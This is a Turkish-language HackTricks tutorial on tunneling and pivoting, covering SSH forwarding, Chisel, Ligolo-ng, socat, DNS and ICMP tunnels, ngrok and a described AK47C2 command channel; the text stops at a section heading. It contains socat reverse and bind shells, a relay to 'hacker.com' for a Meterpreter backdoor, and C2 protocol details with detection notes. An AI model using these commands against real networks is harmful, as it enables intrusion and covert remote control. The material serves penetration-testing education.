# Tunneling ve Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> Nmap'in proxy desteği TCP bağlantılarıyla sınırlıdır ve ping, port veya işletim sistemi algılama taramalarını etkilemez. Scanner bir SOCKS proxy'nin arkasındaysa, **host discovery'yi devre dışı bırakın** (`-Pn`) ve bir **TCP connect scan** (`-sT`) kullanın.<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Son komut, hesabı ve WinRM host'unu belirtmek için Evil-WinRM'in `-u` ve `-i` seçeneklerini kullanır; varsayılan WinRM portu 5985'tir.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH, X11 bağlantılarını, rastgele TCP portlarını ve Unix-domain socket'lerini şifrelenmiş kanalı üzerinden forward edebilir.<sup>[[6]](#references)</sup>

SSH grafik bağlantısı (X)

`-Y`, trusted X11 forwarding'i etkinleştirir ve `-C`, forward edilen veriler için compression talep eder.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server'da yeni Port aç --> Diğer port

Remote (`-R`) forwarding, SSH server üzerinde dinleme yapar ve local tarafa bağlanır; açıkça belirtilen bind address, bu listener'a hangi interface'lerin erişebileceğini kontrol eder.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Ele geçirilmiş host (SSH) --> Third_box:Port

Yerel (`-L`) forwarding, client üzerinde dinler ve hedefe SSH server tarafindan bağlanır.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer

Dynamic (`-D`) forwarding, bağlantıları remote taraftan açılan yerel bir SOCKS4/SOCKS5 listener oluşturur.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Bu, DMZ üzerinden dahili hostlardan hostunuza reverse shell'ler almak için kullanışlıdır:

Sunucunun `GatewayPorts` ayarı, bir remote forward'ın loopback dışına bind edilip edilemeyeceğini kontrol eder; varsayılan değeri `no`'dur.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tüneli

Bu root tabanlı örnek, her iki host üzerinde tünel cihazları oluşturur. Sunucu tun forwarding işlemine izin vermeli ve seçilen hesabın tun cihazına erişimi olmalıdır; burada `root` hesabını kullanmanın bir yolu `PermitRootLogin yes` ayarıdır.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Sunucu tarafında forwarding'i etkinleştirin
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
İstemci tarafında yeni bir route ayarlayın
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6, Terrapin'in erken taşıma bütünlüğü saldırısına karşı koymak için bir strict-KEX extension ekledi. Mümkün olduğunda her iki peer'i de güncelleyin ve daha eski implementasyonlar için vendor guidance'ı izleyin; forwarded channel'ın yalnızca sürüm nedeniyle korunduğunu varsaymayın.<sup>[[8]](#references)</sup>

## SSHUTTLE

Bir host üzerinden tüm **traffic**'i **ssh** ile bir **subnetwork** üzerinden **tunnel** edebilirsiniz.\
Örneğin, 10.10.10.0/24'e giden tüm **traffic**'i forward etmek.

`sshuttle`, SSH üzerinden şeffaf proxying sağlar ve aşağıda gösterildiği gibi subnet'lerin ve özel bir SSH command'ının seçilmesini destekler.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtarla bağlanın
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit'in `portfwd` özelliği local ve remote forwarding'i destekler; SOCKS proxy modülü ise session route'ları veya `autoroute` ile çalışmak üzere tasarlanmıştır ve bu örneklerde varsayılan olarak 1080 portunu dinler.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Ele geçirilmiş host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yol:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike'ın Beacon'ı, SOCKS4a/SOCKS5 bağlantılarını bir Beacon üzerinden relay edebilir; `rportfwd` ele geçirilmiş host üzerinde bind ederken, `rportfwd_local` hedef bağlantısını Cobalt Strike client'ından başlatır.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Trafiği Beacon üzerinden yönlendirmesi gereken interface'lerde Team Server üzerinde bir port açın.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Bu durumda **port Beacon host'unda açılır**, Team Server'da değil; trafik Team Server'a, oradan da belirtilen host:port'a gönderilir.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
The reverse-forwarding manual notes the following behavior:<sup>[[14]](#references)</sup>

- Beacon's reverse port forward, **makineler arasında relay yapmak için değil, Team Server'a trafik tünellemek için** tasarlanmıştır.
- Trafik, P2P bağlantıları da dahil olmak üzere **Beacon'ın C2 trafiği içinde tünellenir**.
- Yüksek portlar genellikle privileged-port kısıtlamalarını aşar; ancak hedef OS politikası ve mevcut listener'lar yine geçerlidir.

### rPort2Port local

> [!WARNING]
> Bu durumda **port Team Server'da değil, Beacon host'unda açılır** ve **trafik Team Server'a değil, Cobalt Strike client'a gönderilir**; ardından buradan belirtilen host:port'a iletilir.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Proje, `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` ve `tunnel.php` gibi web tüneli endpoint'leri sağlar; yerel proxy'yi başlatmadan önce desteklenen endpoint'lerden birini yükleyin.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki releases sayfasından indirebilirsiniz\
Chisel, SSH-korumalı bir bağlantı kullanarak TCP/UDP trafiğini HTTP üzerinden taşır; uyumlu client/server derlemelerini kullanın ve seçilen release'in komut söz dizimini doğrulayın.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart dokümanı, proxy üzerinde bir TUN interface'i, agent için certificate-fingerprint validation'ını ve tunneled network için route kurulumunu açıklar.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding ve Listening

Ligolo-ng, agent üzerinde proxy tarafındaki bir adrese yönlendirme yapan listener'lar ekleyebilir ve ayrılmış `240.0.0.0/4` aralığı, agent-local servislerine ulaşmak için route edilebilir.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent'ın Yerel Portlarına Erişim
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot, reverse tunnel'ı kurban üzerinden başlatır ve saldırganın loopback adresinde bir SOCKS4 proxy'si sunar; README dosyasında ayrıca NTLM-proxy kimlik bilgileri ve hash seçenekleri belgelenmiştir.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** üzerinden Pivoting
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat, `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` ve `PROXY` gibi adres türlerini birleştirir; aşağıdaki örnekler, belgelenmiş bu uç noktaları bir arada kullanır.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks üzerinden Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat Üzerinden Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
**Kimlik doğrulaması gerektirmeyen bir proxy** üzerinden, socat'ın belgelenmiş `PROXY` adres türünü kullanarak, kurbanın konsolunda son satır yerine bu satırı çalıştırarak geçiş yapabilirsiniz.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Her iki tarafta da sertifikalar oluşturun: Client ve Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Yerel SSH portunu (22), saldırgan ana makinesinin 443 portuna bağlayın
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink, `ssh` ile benzer SSH forwarding seçeneklerine sahip, PuTTY'nin command-line bağlantı aracıdır.<sup>[[22]](#references)</sup>

SSH portu için büyük harfli `-P` kullanın. `-pw` geriye dönük uyumluluk için korunmuştur, ancak parolayı process list içinde açığa çıkarır; mümkün olduğunda key authentication veya `-pwfile` kullanmayı tercih edin.<sup>[[22]](#references)[[23]](#references)</sup>

Bu binary victim üzerinde çalıştırılacağından ve bir SSH client olduğundan reverse connection için SSH service ve portunu açın; aşağıdaki örnek, yerel olarak erişilebilir bir portu attacker's machine'a forward etmek için `-R` kullanır.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Kalıcı `portproxy` kuralları oluştururken veya değiştirirken, host tarafından gereken izinlere sahip bir context kullanın. Microsoft, aşağıda kullanılan `v4tov4` add, show ve delete biçimlerini belgeler.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**Sistem üzerinden RDP erişiminizin olması gerekir**.\
İndirin:

SocksOverRDP, mevcut bir RDP oturumu üzerinden SOCKS5 bağlantısı taşımak için Remote Desktop Dynamic Virtual Channels kullanır; istemci eklentisi `127.0.0.1:1080` adresini dinlerken sunucu bileşeni RDP hedefinde çalışır.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 İkili Dosyaları](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`) bileşenlerini kullanır. DVC, **paketlerin RDP bağlantısı üzerinden tünellenmesinden** sorumludur.
2. [Proxifier Portable İkili Dosyası](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **victim** makineye **connect** olabiliriz; **SocksOverRDP plugin**'inin etkin olduğunu belirten bir **prompt** almalıyız ve plugin **127.0.0.1:1080** üzerinde **listen** edecektir.

**RDP** üzerinden **connect** olun ve victim makinesine `SocksOverRDP-Server.exe` binary'sini upload edip execute edin:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, makinenizde (saldırgan) 1080 portunun dinlemede olduğunu doğrulayın:
```
netstat -antb | findstr 1080
```
Artık trafiği bu port üzerinden proxy'lemek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.<sup>[[26]](#references)</sup>

## Windows GUI Uygulamalarını Proxify Et

Windows GUI uygulamalarının bir proxy üzerinden gezinmesini sağlamak için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** bölümünde SOCKS server'ın IP adresini ve portunu ekleyin.\
**Profile -> Proxification Rules** bölümünde proxify edilecek programın adını ve proxify etmek istediğiniz IP'lere yapılacak bağlantıları ekleyin; Proxifier kuralları uygulamalar, hedef host'lar ve port'larla eşleşebilir.<sup>[[27]](#references)</sup>

## NTLM proxy üzerinden Tünel

Daha önce bahsedilen **Rpivot** aracı, NTLM ile kimlik doğrulayan bir proxy üzerinden relay yapabilir. **OpenVPN** de bir auth dosyası ve NTLMv2 yöntemiyle yapılandırıldığında proxy üzerinden routing yapabilir; bu, proxy traversal'dır ve proxy authentication bypass değildir.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm, upstream NTLM proxy'lerinde kimlik doğrulaması yapar, yerel dinleyiciler açar ve yerel bir tunnel portunu bir hedef servise eşleyebilir; istemciler daha sonra bu yerel portu kullanabilir.<sup>[[29]](#references)</sup>\
Örneğin, 443 portunu yönlendirmek için
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin victim üzerindeki **SSH** servisini 443 portunu dinleyecek şekilde ayarlarsanız, attacker üzerindeki 2222 portu üzerinden ona bağlanabilirsiniz.<sup>[[29]](#references)</sup>\
Ayrıca attacker 2222 portunu dinlerken localhost:443'e bağlanan bir **meterpreter** da kullanabilirsiniz.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy), Microsoft'un .NET reverse-proxy toolkit'idir. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine, DNS sorguları üzerinden bir IPv4 tüneli oluşturur ve TUN interface'lerini kullanır; belgelenen kurulum, her iki uçta da bu interface'leri oluşturmak için gereken ayrıcalıkları gerektirir.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS üzerinden taşıma, doğrudan TCP'den daha fazla ek yüke sahiptir ve genellikle yavaştır; şu komutu kullanarak bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturabilirsiniz:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

Dnscat2, DNS üzerinden şifrelenmiş bir command-and-control kanalı oluşturur; aşağıdaki server ve client komutları, belgelenen kullanımını temel alır.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'de**

PowerShell'de bir dnscat2 client çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz; README, aşağıda gösterilen `Start-Dnscat2` parametrelerini belgeler.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile Port Forwarding**

Dnscat2'nin etkileşimli `listen` komutu, yerel bir listener'ı uzak bir host ve porta eşler.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS'ini Değiştirme

Proxychains-ng, dinamik olarak linklenmiş TCP bağlantılarına kanca atar ve UDP veya ICMP taşıyamaz; DNS proxying yapılandırılabilir olduğundan, sabit bir public resolver varsaymak yerine yüklü `proxychains.conf` dosyasını ve resolver helper'ını inceleyin. Legacy `proxyresolv` script'leri resolver seçimi için `PROXY_DNS_SERVER` değişkenini sunar; internal isimler gerektiğinde pivot tarafından erişilebilen bir resolver kullanın.<sup>[[34]](#references)[[35]](#references)</sup>

## Go'da Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor'ı, kurumsal network'lerde nadiren engellenen iki protokol olan yalnızca outbound **DNS** ve **plain HTTP POST** trafiğini kötüye kullanan bir **dual-channel C2 ("AK47C2")** oluşturdu.<sup>[[2]](#references)</sup>

1. **DNS modu (AK47DNS)**
• Rastgele 5 karakterlik bir SessionID üretir (ör. `H4T14`).
• *Task request* için `1` veya *result* için `2` ekler ve farklı alanları (flags, SessionID, computer name) birleştirir.
• Her alan **ASCII key `VHBD@H` ile XOR-encrypted**, hex-encoded olur ve noktalarla birleştirilir; son olarak attacker-controlled domain ile biter:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Request'ler **TXT** (ve fallback olarak **MG**) record'ları için `DnsQuery()` kullanır.
• Response 0xFF byte'ı aştığında backdoor, data'yı 63-byte parçalarına **fragments** eder ve C2 server'ın bunları yeniden sıralayabilmesi için şu marker'ları ekler:
`s<SessionID>t<TOTAL>p<POS>`

2. **HTTP modu (AK47HTTP)**
• Bir JSON envelope oluşturur:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Tüm blob `VHBD@H` ile XOR-`encrypted` → hex → `Content-Type: text/plain` header'ı ile **`POST /`** body'si olarak gönderilir.
• Reply aynı encoding'i izler ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile execute edilir.

Blue Team notları
• İlk label'ı uzun hexadecimal olan ve her zaman nadir bir domain ile biten olağandışı **TXT query**'lerini arayın.
• ASCII-hex'in ardından gelen sabit bir XOR key, YARA ile kolayca tespit edilebilir: `6?56484244?484` (`VHBD@H` hex olarak).
• HTTP için, pure hex olan ve iki byte'ın katı uzunluğa sahip `text/plain` POST body'lerini flag'leyin.

{{#note}}
Channel, her sub-domain label'ını 63-octet DNS limiti içinde tutar; ancak protocol compliance tek başına bunu stealthy hale getirmez; nadir domain'ler, uzun hexadecimal label'lar ve query volume hâlâ detection signal'leridir.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans, bir TUN device ve ICMP echo request'leri kullanan bir IPv4-over-ICMP tunnel'ını belgeler; setup, interface oluşturmak için yeterli privilege gerektirir.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng, TCP bağlantılarını ICMP üzerinden taşır ve proxy, yerel listener, hedef host ve hedef port için aşağıda gösterilen `-p`, `-l`, `-r` ve `-R` seçeneklerini kullanır.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/), yerel network servislerini güvenli bir tunnel üzerinden online hale getiren bir agent'tır; CLI dokümantasyonu HTTP, TCP ve file URL endpoint'lerini açıklar ve yazdırılan endpoint hostname'i endpoint'e ve account'a göre değişebilir.<sup>[[39]](#references)</sup>

### Kurulum

- Bir account oluşturun: https://ngrok.com/signup
- Client indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent ayrıca gerektiğinde authentication ve TLS seçeneklerini destekler.<sup>[[39]](#references)</sup>_

#### TCP Tünelleme
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Dosyaları HTTP ile açığa çıkarma
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP çağrılarını Sniffing

_XSS,SSRF,SSTI ... için kullanışlıdır._\
Standalone agent, HTTP inspection interface'ini varsayılan olarak `http://127.0.0.1:4040` adresinde sunar; bu arayüz HTTP trafiği içindir.<sup>[[40]](#references)</sup>

#### Dahili HTTP servisini Tunneling

`--host-header=rewrite` seçeneği, upstream HTTP `Host` header'ını yerel servisle eşleşecek şekilde yeniden yazar.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

Bu, ngrok Agent Config v2 kullanır; adlandırılmış tüneller `proto` ve `addr` kullanır ve `ngrok start` ile başlatılır.<sup>[[42]](#references)</sup> 3 tünel açar:

- 2 TCP
- /tmp/httpbin/ üzerinden statik dosya sunan 1 HTTP
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel'ın `cloudflared` connector'ı dışa giden bağlantılar kurar; yayınlanan uygulamalar HTTP, HTTPS, TCP, SSH ve RDP yönlendirebilir; quick tunnels ise HTTP geliştirme için tasarlanmıştır.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

